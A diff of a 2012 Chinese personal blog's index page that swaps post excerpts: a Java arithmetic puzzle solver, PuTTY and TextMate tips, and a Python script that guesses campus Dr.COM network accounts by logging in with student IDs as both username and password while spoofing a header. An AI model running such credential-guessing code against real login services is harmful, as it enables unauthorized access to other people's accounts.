+</span><span class='line'>           <span class="n">allOpt</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">optString</span><span class="o">.</span><span class="na">charAt</span><span class="o">(</span><span class="n">i</span><span class="o">)</span> <span class="o">+</span> <span class="s">&quot;&quot;</span><span class="o">);</span>
+</span><span class='line'>       <span class="o">}</span>
+</span><span class='line'>       <span class="kt">int</span> <span class="n">result</span> <span class="o">=</span> <span class="n">allNum</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="mi">0</span><span class="o">);</span>
+</span><span class='line'>       <span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">1</span><span class="o">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">allNum</span><span class="o">.</span><span class="na">size</span><span class="o">();</span> <span class="n">i</span><span class="o">++)</span>
+</span><span class='line'>       <span class="o">{</span>
+</span><span class='line'>           <span class="kt">char</span> <span class="n">x</span> <span class="o">=</span> <span class="o">(</span><span class="n">i</span> <span class="o">-</span> <span class="mi">1</span><span class="o">)</span> <span class="o">==</span> <span class="n">allOpt</span><span class="o">.</span><span class="na">size</span><span class="o">()?</span><span class="sc">&#39;+&#39;</span><span class="o">:</span><span class="n">allOpt</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">i</span> <span class="o">-</span> <span class="mi">1</span><span class="o">).</span><span class="na">charAt</span><span class="o">(</span><span class="mi">0</span><span class="o">);</span>
+</span><span class='line'>           <span class="kt">int</span> <span class="n">nextNum</span> <span class="o">=</span> <span class="n">i</span> <span class="o">==</span> <span class="n">allNum</span><span class="o">.</span><span class="na">size</span><span class="o">()?</span><span class="mi">0</span><span class="o">:</span><span class="n">allNum</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">i</span><span class="o">);</span>
+</span><span class='line'>           <span class="n">result</span> <span class="o">=</span> <span class="n">getValue</span><span class="o">(</span><span class="n">result</span><span class="o">,</span> <span class="n">nextNum</span><span class="o">,</span> <span class="n">x</span><span class="o">);</span>
+</span><span class='line'>       <span class="o">}</span>
+</span><span class='line'>
+</span><span class='line'>       <span class="k">return</span> <span class="n">result</span><span class="o">;</span>
+</span><span class='line'>
+</span><span class='line'>   <span class="o">}</span>
+</span><span class='line'>
+</span><span class='line'>   <span class="kd">public</span> <span class="kd">static</span> <span class="kt">int</span> <span class="nf">getValue</span><span class="o">(</span><span class="n">Integer</span> <span class="n">num1</span><span class="o">,</span> <span class="n">Integer</span> <span class="n">num2</span><span class="o">,</span> <span class="kt">char</span> <span class="n">opt</span><span class="o">)</span>
+</span><span class='line'>   <span class="o">{</span>
+</span><span class='line'>       <span class="kt">int</span> <span class="n">ret</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span>
+</span><span class='line'>       <span class="k">switch</span> <span class="o">(</span><span class="n">opt</span><span class="o">)</span>
+</span><span class='line'>       <span class="o">{</span>
+</span><span class='line'>           <span class="k">case</span> <span class="sc">&#39;+&#39;</span><span class="o">:</span>
+</span><span class='line'>               <span class="n">ret</span> <span class="o">=</span> <span class="n">num1</span> <span class="o">+</span> <span class="n">num2</span><span class="o">;</span>
+</span><span class='line'>               <span class="k">break</span><span class="o">;</span>
+</span><span class='line'>           <span class="k">case</span> <span class="sc">&#39;-&#39;</span><span class="o">:</span>
+</span><span class='line'>               <span class="n">ret</span> <span class="o">=</span> <span class="n">num1</span> <span class="o">-</span> <span class="n">num2</span><span class="o">;</span>
+</span><span class='line'>               <span class="k">break</span><span class="o">;</span>
+</span><span class='line'>           <span class="k">default</span><span class="o">:</span>
+</span><span class='line'>               <span class="k">break</span><span class="o">;</span>
+</span><span class='line'>       <span class="o">}</span>
+</span><span class='line'>
+</span><span class='line'>       <span class="k">return</span> <span class="n">ret</span><span class="o">;</span>
+</span><span class='line'>   <span class="o">}</span>
+</span><span class='line'><span class="o">}</span>
+</span></code></pre></td></tr></table></div></figure>
 
-<p>有位朋友推荐了rimeime输入法，正在使用中，看这个反应速度很满意，听说是用配置文件可以做出很玄的样子，暂时不去研究这些，能保证不卡就是很好的进步，如果可以的话，果断放弃掉其他输入法！！！</p>
 
-<p>希望rimeime能够把中英文切换状态在growl中体现出来，起码也该给一个提醒：）</p>
+<p>结果是这样的：</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>1+2+34+5+67-8+9
+</span><span class='line'>1+234-56-78+9
+</span><span class='line'>1-2+3+45-6+78-9
+</span><span class='line'>12+3+45+67-8-9
+</span><span class='line'>12+34+56+7-8+9
+</span><span class='line'>12-3+4-5+6+7+89
+</span><span class='line'>123+4+5+67-89
+</span><span class='line'>123+4-5-6-7-8+9
+</span><span class='line'>123-4+5-6-7+8-9
+</span><span class='line'>123-4-5+6+7-8-9
+</span><span class='line'>All Run Time: 496ms
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>最后我算了算运行时间，应该这就是很慢的了，幸好只有加减和空，要不然会更麻烦的……</p>
 
 		
 		
@@ -245,11 +530,11 @@ System Benchmarks Index Score                                         382.2</pre
   
 
 
-<time datetime="2012-05-23T20:29:00+08:00" pubdate data-updated="true">May 23<span>rd</span>, 2012</time></div>
+<time datetime="2012-04-08T14:20:00+08:00" pubdate data-updated="true">Apr 8<span>th</span>, 2012</time></div>
 	<div class="tags">
 
 
-	<a class='category' href='/blog/categories/macxi-tong-zhong-de-shi-yong-ji-qiao/'>Mac系统中的使用技巧</a>, <a class='category' href='/blog/categories/shu-ru-fa/'>输入法</a>
+	<a class='category' href='/blog/categories/algorithm/'>algorithm</a>
 
 
 </div>
@@ -261,24 +546,203 @@ System Benchmarks Index Score                                         382.2</pre
     <article class="post">
 	<h2 class="title">
 		
-		<a href="/blog/2012/05/23/two-mysql-lib-issue-after-yum-update/">
+		<a href="/blog/2012/04/04/crack-drcom-account-in-python/">
 		
-			Ldconfig: /usr/lib/libmysqlclient.so.16 Is Not a Symbolic Link的问题</a>
+			Python猜研究生账号</a>
 	</h2>
 	<div class="entry-content">
-		<p>刚刚用yum升级了系统，发现日志中有很多这样的提示：</p>
+		<p>嗯，为何要猜研究生账号呢？是这样的，我们学校用的drcom控制网络访问，如果你用本科生账号，那么你最快下载速度也就是100kb/s，如果是老师、研究生账号呢，最快7Mb/s，这是什么差距你应该明白吧？！于是写了一个python的脚本来不断猜测研究生账号，但很可惜的是，猜出来的9个账号经过测试都还是有限速效果，真不知道这些账号是不是研究生账号呢？！！！可恶的学校啊！！！</p>
 
-<p><span style="color: #111111; font-family: 微软雅黑, Arial, Helvetica, sans-serif; font-size: 12px; line-height: 20px; text-align: left;">ldconfig: /usr/lib/libmysqlclient.so.16 is not a symbolic link</span></p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+<span class='line-number'>59</span>
+<span class='line-number'>60</span>
+<span class='line-number'>61</span>
+<span class='line-number'>62</span>
+<span class='line-number'>63</span>
+<span class='line-number'>64</span>
+<span class='line-number'>65</span>
+<span class='line-number'>66</span>
+<span class='line-number'>67</span>
+<span class='line-number'>68</span>
+<span class='line-number'>69</span>
+<span class='line-number'>70</span>
+<span class='line-number'>71</span>
+<span class='line-number'>72</span>
+<span class='line-number'>73</span>
+<span class='line-number'>74</span>
+<span class='line-number'>75</span>
+<span class='line-number'>76</span>
+<span class='line-number'>77</span>
+<span class='line-number'>78</span>
+<span class='line-number'>79</span>
+<span class='line-number'>80</span>
+<span class='line-number'>81</span>
+<span class='line-number'>82</span>
+<span class='line-number'>83</span>
+<span class='line-number'>84</span>
+<span class='line-number'>85</span>
+<span class='line-number'>86</span>
+<span class='line-number'>87</span>
+<span class='line-number'>88</span>
+<span class='line-number'>89</span>
+<span class='line-number'>90</span>
+<span class='line-number'>91</span>
+<span class='line-number'>92</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#! /usr/bin python</span>
+</span><span class='line'><span class="c"># encoding: utf-8</span>
+</span><span class='line'>
+</span><span class='line'><span class="kn">import</span> <span class="nn">urllib2</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">urllib</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">sys</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">types</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">guess_list</span> <span class="o">=</span> <span class="p">[]</span>
+</span><span class='line'><span class="n">server_url</span> <span class="o">=</span> <span class="s">&quot;http://222.174.155.19/&quot;</span>
+</span><span class='line'><span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s">&#39;User-Agent&#39;</span><span class="p">:</span><span class="s">&#39;Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6&#39;</span><span class="p">,</span>
+</span><span class='line'><span class="s">&#39;X-Forwarded-For&#39;</span><span class="p">:</span><span class="s">&#39;1.1.1.1&#39;</span><span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">def</span> <span class="nf">usage</span><span class="p">():</span>
+</span><span class='line'><span class="k">print</span> <span class="s">&quot;USAGE 00: python guess.py FILEPATH of account list file,like: python guess.py ./lists.dat&quot;</span>
+</span><span class='line'><span class="k">print</span> <span class="s">&quot;USAGE 01: python guess.py START END like: python guess.py 2009123456 2009145396&quot;</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">def</span> <span class="nf">Login</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">):</span>
+</span><span class='line'><span class="n">params</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">urlencode</span><span class="p">({</span><span class="s">&#39;DDDDD&#39;</span><span class="p">:</span> <span class="n">username</span><span class="p">,</span> <span class="s">&#39;upass&#39;</span><span class="p">:</span> <span class="n">password</span><span class="p">,</span> <span class="s">&#39;0MKKey&#39;</span><span class="p">:</span> <span class="s">&quot;%B5%C7%C2%BC</span><span class="si">%20Lo</span><span class="s">gin&quot;</span><span class="p">})</span>
+</span><span class='line'><span class="n">request</span> <span class="o">=</span> <span class="n">urllib2</span><span class="o">.</span><span class="n">Request</span><span class="p">(</span><span class="n">url</span> <span class="o">=</span> <span class="n">server_url</span><span class="p">,</span> <span class="n">data</span> <span class="o">=</span> <span class="n">params</span><span class="p">,</span> <span class="n">headers</span> <span class="o">=</span> <span class="n">headers</span><span class="p">)</span>
+</span><span class='line'><span class="k">try</span><span class="p">:</span>
+</span><span class='line'><span class="n">output</span> <span class="o">=</span> <span class="n">urllib2</span><span class="o">.</span><span class="n">urlopen</span><span class="p">(</span><span class="n">request</span><span class="p">,</span> <span class="n">timeout</span> <span class="o">=</span> <span class="mi">3</span><span class="p">)</span><span class="o">.</span><span class="n">readlines</span><span class="p">()</span>
+</span><span class='line'><span class="n">Log</span><span class="p">(</span><span class="n">output</span><span class="p">[</span><span class="mi">5</span><span class="p">],</span> <span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">)</span>
+</span><span class='line'><span class="k">except</span><span class="p">:</span>
+</span><span class='line'><span class="k">print</span> <span class="s">&quot;timeout!&quot;</span>
+</span><span class='line'><span class="k">global</span> <span class="n">guess_list</span>
+</span><span class='line'><span class="n">guess_list</span> <span class="o">=</span> <span class="n">guess_list</span><span class="p">[</span><span class="mi">1</span><span class="p">:]</span>
+</span><span class='line'><span class="n">guess_list</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">username</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">def</span> <span class="nf">Logout</span><span class="p">():</span>
+</span><span class='line'><span class="n">output</span> <span class="o">=</span> <span class="n">urllib2</span><span class="o">.</span><span class="n">urlopen</span><span class="p">(</span><span class="n">server_url</span> <span class="o">+</span> <span class="s">&quot;F.htm&quot;</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">def</span> <span class="nf">Log</span><span class="p">(</span><span class="n">output</span><span class="p">,</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">):</span>
+</span><span class='line'><span class="c"># &quot;msga=&#39;error1&#39;&quot; =&gt; can not login in web</span>
+</span><span class='line'><span class="n">result</span> <span class="o">=</span> <span class="n">output</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s">&quot;msga=&#39;error1&#39;&quot;</span><span class="p">)</span>
+</span><span class='line'><span class="k">if</span> <span class="n">result</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">:</span>
+</span><span class='line'><span class="k">print</span> <span class="s">&quot;find one!!!&quot;</span>
+</span><span class='line'><span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">&quot;./content.dat&quot;</span><span class="p">,</span> <span class="s">&#39;a&#39;</span><span class="p">)</span>
+</span><span class='line'><span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">username</span><span class="p">)</span> <span class="o">+</span> <span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
+</span><span class='line'><span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span><span class='line'><span class="k">else</span><span class="p">:</span>
+</span><span class='line'><span class="k">print</span> <span class="s">&quot;pass!&quot;</span>
+</span><span class='line'><span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">&quot;./bad.dat&quot;</span><span class="p">,</span><span class="s">&#39;a&#39;</span><span class="p">)</span>
+</span><span class='line'><span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">username</span><span class="p">)</span> <span class="o">+</span> <span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
+</span><span class='line'><span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span><span class='line'><span class="c">#drop first element</span>
+</span><span class='line'><span class="k">global</span> <span class="n">guess_list</span>
+</span><span class='line'><span class="n">guess_list</span> <span class="o">=</span> <span class="n">guess_list</span><span class="p">[</span><span class="mi">1</span><span class="p">:]</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">def</span> <span class="nf">show_result</span><span class="p">():</span>
+</span><span class='line'><span class="k">print</span> <span class="s">&quot;Result:##########################################&quot;</span>
+</span><span class='line'><span class="k">print</span> <span class="s">&quot;Have Guessed:&quot;</span>
+</span><span class='line'><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">open</span><span class="p">(</span><span class="s">&quot;./content.dat&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">readlines</span><span class="p">():</span>
+</span><span class='line'><span class="k">print</span> <span class="n">i</span><span class="p">,</span>
+</span><span class='line'><span class="k">print</span> <span class="s">&quot;some accounts can not guessed are in bad.dat&quot;</span>
+</span><span class='line'><span class="k">print</span> <span class="s">&quot;Result:##########################################&quot;</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">def</span> <span class="nf">get_timeout_list</span><span class="p">(</span><span class="n">timeout_file_path</span><span class="p">):</span>
+</span><span class='line'><span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">timeout_file_path</span><span class="p">)</span>
+</span><span class='line'><span class="k">global</span> <span class="n">guess_list</span>
+</span><span class='line'><span class="n">guess_list</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">readlines</span><span class="p">()</span>
+</span><span class='line'><span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">==</span> <span class="mi">2</span><span class="p">:</span>
+</span><span class='line'><span class="c"># itself and only one argv,the path of account list file...</span>
+</span><span class='line'><span class="n">get_timeout_list</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
+</span><span class='line'><span class="k">elif</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">):</span>
+</span><span class='line'><span class="n">usage</span><span class="p">()</span>
+</span><span class='line'><span class="k">else</span><span class="p">:</span>
+</span><span class='line'><span class="c">#start and end account,argv[1] and argv[2]</span>
+</span><span class='line'><span class="n">start</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
+</span><span class='line'><span class="n">end</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span>
+</span><span class='line'><span class="k">if</span> <span class="n">start</span> <span class="o">&gt;</span> <span class="n">end</span><span class="p">:</span>
+</span><span class='line'><span class="n">usage</span><span class="p">()</span>
+</span><span class='line'><span class="nb">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+</span><span class='line'><span class="k">else</span><span class="p">:</span>
+</span><span class='line'><span class="n">guess_list</span> <span class="o">=</span> <span class="nb">range</span><span class="p">(</span><span class="n">start</span><span class="p">,</span> <span class="n">end</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">&quot;__main__&quot;</span><span class="p">:</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+</span><span class='line'><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">guess_list</span><span class="p">:</span>
+</span><span class='line'><span class="c">#drop last \n or \r</span>
+</span><span class='line'><span class="k">if</span> <span class="nb">type</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="o">==</span> <span class="n">types</span><span class="o">.</span><span class="n">StringType</span><span class="p">:</span>
+</span><span class='line'><span class="n">i</span> <span class="o">=</span> <span class="n">i</span><span class="o">.</span><span class="n">rstrip</span><span class="p">(</span><span class="s">&#39;</span><span class="se">\n\r</span><span class="s">&#39;</span><span class="p">)</span>
+</span><span class='line'><span class="n">Logout</span><span class="p">()</span>
+</span><span class='line'><span class="k">print</span> <span class="s">&quot;Guess: &quot;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+</span><span class='line'><span class="n">Login</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">i</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">guess_list</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+</span><span class='line'><span class="k">break</span>
+</span><span class='line'><span class="n">show_result</span><span class="p">()</span>
+</span></code></pre></td></tr></table></div></figure>
 
-<p><span style="color: #111111; font-family: 微软雅黑, Arial, Helvetica, sans-serif; font-size: 12px; line-height: 20px; text-align: left;">ldconfig: /usr/lib/libmysqlclient_r.so.16 is not a symbolic link</span></p>
 
-<p>于是Google了一下，找到一个解决方法，在<a href="http://tiger.im/286.html" target="_blank">这里</a>.</p>
+<p>主要就是用了drcom的网页登陆，当然大部分账号都是不能web登陆的啦，不过账号密码正确的话会弹出来一个提示，drcom是使用的js来显示的，于是我监测了是不是有“msga=&lsquo;error1&#8217;”字符串，当然严格来讲还得监测是不是有&#8221;Msg=0&#8221;这个字符串才好，我就省略了……</p>
 
-<p>就是重建了两条连接过去即可：</p>
-
-<pre class="prettyprint linenums bush:bash" lang="bash">ln -sf /usr/local/mysql/lib/mysql/libmysqlclient.so.16 /usr/lib/mysqlclient.so.16
-ln -sf /usr/local/mysql/lib/mysql/libmysqlclient_r.so.16 /usr/lib/libmysqlclient_r.so.16</pre>
-
+<p>希望被drcom困扰的人们都能拿去用用，希望对你们有帮助！</p>
 
 		
 		
@@ -298,11 +762,11 @@ ln -sf /usr/local/mysql/lib/mysql/libmysqlclient_r.so.16 /usr/lib/libmysqlclient
   
 
 
-<time datetime="2012-05-23T19:50:00+08:00" pubdate data-updated="true">May 23<span>rd</span>, 2012</time></div>
+<time datetime="2012-04-04T09:01:00+08:00" pubdate data-updated="true">Apr 4<span>th</span>, 2012</time></div>
 	<div class="tags">
 
 
-	<a class='category' href='/blog/categories/mysql/'>mysql</a>, <a class='category' href='/blog/categories/vps/'>vps</a>, <a class='category' href='/blog/categories/yum/'>yum</a>, <a class='category' href='/blog/categories/ji-zhu/'>技术</a>
+	<a class='category' href='/blog/categories/python/'>python</a>
 
 
 </div>
@@ -314,16 +778,23 @@ ln -sf /usr/local/mysql/lib/mysql/libmysqlclient_r.so.16 /usr/lib/libmysqlclient
     <article class="post">
 	<h2 class="title">
 		
-		<a href="/blog/2012/05/23/optimize-my-vps/">
+		<a href="/blog/2012/03/02/bad-chinese-encoding-in-putty/">
 		
-			优化了一下VPS</a>
+			Putty的中文乱码</a>
 	</h2>
 	<div class="entry-content">
-		<p>一开始玩VPS的时候跟着网上的各种优化教程做了很多工作，中途重装了一次系统后什么优化工作都没做，基本就和裸奔一样啦，还有次好奇怪的突发事件，让我以为是hacker进来了，但后来又不了了之了。</p>
+		<p>着急回家就没带mbp，现在需要修改一下服务器上的文件，于是用了putty这款软件，一定要去官方下载啊，记得前一段时间爆发了在putty中嵌入木马从而盗取了N多服务器的root权限事件。</p>
 
-<p>今天把ssh的端口改掉了，加入iptables各种规则，希望这样能让vps的uptime提升一下，现在不清楚是不是做了这些工作就有好处，但总归是没有坏处的。</p>
+<p>不过在用的时候发现查看带有中文字符的文件会出现乱码，在这里得到了解决方案：</p>
 
-<p>在dnspod上开启了一个宕机监控，同时把监控宝上的ping测试改掉了，因为现在不允许ping了～就这样监控一段时间试试效果吧，如果真有用的话我就一定要每次重装os后都做！！！</p>
+<ol>
+<li><p>打开putty主程序，选择window-〉Appearance-〉Font settings-〉Change…,选择Fixedsys字体,字符集选择CHINESEGB2312。</p></li>
+<li><p>在window-〉Appearance -〉Translation中，Received data assumed to be in which character set 中,把Use font encoding改为UTF-8如果经常使用,把这些设置保存在session里面.</p></li>
+<li><p>现在打开putty,登录成功后,在shell中输入:export LCALL=’zh_CN.utf8’</p></li>
+</ol>
+
+
+<p>然后再打开文件就没问题了。</p>
 
 		
 		
@@ -343,11 +814,11 @@ ln -sf /usr/local/mysql/lib/mysql/libmysqlclient_r.so.16 /usr/lib/libmysqlclient
   
 
 
-<time datetime="2012-05-23T15:30:00+08:00" pubdate data-updated="true">May 23<span>rd</span>, 2012</time></div>
+<time datetime="2012-03-02T12:08:00+08:00" pubdate data-updated="true">Mar 2<span>nd</span>, 2012</time></div>
 	<div class="tags">
 
 
-	<a class='category' href='/blog/categories/vps/'>vps</a>, <a class='category' href='/blog/categories/ji-zhu/'>技术</a>
+	<a class='category' href='/blog/categories/dev/'>dev</a>
 
 
 </div>
@@ -359,29 +830,33 @@ ln -sf /usr/local/mysql/lib/mysql/libmysqlclient_r.so.16 /usr/lib/libmysqlclient
     <article class="post">
 	<h2 class="title">
 		
-		<a href="/blog/2012/05/22/little-cheat-for-game/">
+		<a href="/blog/2012/02/23/have-bought-textmate/">
 		
-			小作弊玩游戏</a>
+			买了textmate</a>
 	</h2>
 	<div class="entry-content">
-		<p>有这么一个小游戏，按照顺序输入字母表的26个英文字母，看看你输入的总时间是多少。有个变态的人竟然在2s内就输入了26个字母，而且不允许有任何错误，真心佩服！！！</p>
+		<p>截至目前，这是我买得最贵的一款软件了——39欧元（327RMB）</p>
 
-<p>我试了试，快的话我只能在6s左右完成，根本上不了排行榜，于是我考虑作弊……</p>
+<p>一直在豆瓣Textmate小组中等人家团购，自己也从没在官网试过购买，一看是用的paypal做中转，感觉不靠谱，以前也没试过paypal的支付，没想到这次成功了，先用了张信用卡支付，发现不行，结果换普通银行卡，直接跳转到了银联，然后我又用的信用卡透支……</p>
 
-<pre class="prettyprint linenums bush:bash" lang="bash">tell application "Google Chrome"
-activate
-repeat with i from 0 to 25
-delay 0.04
-tell application "System Events"
-keystroke (ASCII character of (97 + i))
-end tell
-end repeat
-end tell</pre>
+<p>稍微配置了一下textmate，按照<a href="http://www.lixiaolai.com/archives/10895.html">这里</a>的方法，其中1.5版本的中文字体那里，建议不要尝试了，不完美，还是等2.0正式发布了吧，听说2.0对于中文字体支持得很好，但我懒得下载测试版来用：）</p>
+
+<p>加入GetBundles：</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>mkdir -p ~/Library/Application<span class="se">\ </span>Support/TextMate/Bundles
+</span><span class='line'><span class="nb">cd</span> !<span class="err">$</span>
+</span><span class='line'>svn co http://svn.textmate.org/trunk/Review/Bundles/GetBundles.tmbundle/
+</span><span class='line'>osascript -e <span class="s1">&#39;tell app &quot;TextMate&quot; to reload bundles&#39;</span>
+</span></code></pre></td></tr></table></div></figure>
 
 
-<p>不减速的话系统根本无法记录，所以还是减速了，这个速度正好拿到第一名的位置，OK，剩下的让人去羡慕吧！！！</p>
+<p>第一次见cd还能这样用，这样简直太方便了！还有最后那句script，多么优美的句子：）</p>
 
-<p>感谢Apple提供的AppleScript这样优秀的脚本工具～</p>
+<p>以后就要多用textmate了，先放弃emacs。</p>
 
 		
 		
@@ -401,11 +876,11 @@ end tell</pre>
   
 
 
-<time datetime="2012-05-22T23:31:00+08:00" pubdate data-updated="true">May 22<span>nd</span>, 2012</time></div>
+<time datetime="2012-02-23T19:29:00+08:00" pubdate data-updated="true">Feb 23<span>rd</span>, 2012</time></div>
 	<div class="tags">
 
 
-	<a class='category' href='/blog/categories/applescript/'>applescript</a>, <a class='category' href='/blog/categories/ji-zhu/'>技术</a>
+	<a class='category' href='/blog/categories/mac/'>mac</a>
 
 
 </div>
@@ -417,98 +892,35 @@ end tell</pre>
     <article class="post">
 	<h2 class="title">
 		
-		<a href="/blog/2012/05/14/left-outer-join-and-multiply-select-in-sqlite3/">
+		<a href="/blog/2012/02/15/set-timezone-in-rails/">
 		
-			Sqlite3连接查询和多次select的对比</a>
+			设置Rails中的timezone</a>
 	</h2>
 	<div class="entry-content">
-		<p>通过todo_meta把todo和user联系起来，要查出userid为0～6的所有todo。随机了10W条todo数据进去。</p>
+		<p>Timezone是很关键的东西哦，特别是某些app根据时间来作出不同反映的时候设置好Timezone就是必须的了。</p>
 
-<p>左外连接查询比两次select快10～20%左右。</p>
+<p>没设置之前，插入到数据库中的时间都是utc时间，晚8小时，修改两处就差不多正常了：）编辑config/application.rb，我用的是Rails3.2.1</p>
 
-<pre class="prettyprint linenums bush:python" lang="python">#! /usr/bin/env python
-# coding: utf-8
-
-import sqlite3
-import os
-import time
-import random
-
-def connect():
-return sqlite3.connect('./test.db')
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="n">config</span><span class="o">.</span><span class="n">active_record</span><span class="o">.</span><span class="n">default_timezone</span> <span class="o">=</span> <span class="ss">:local</span>
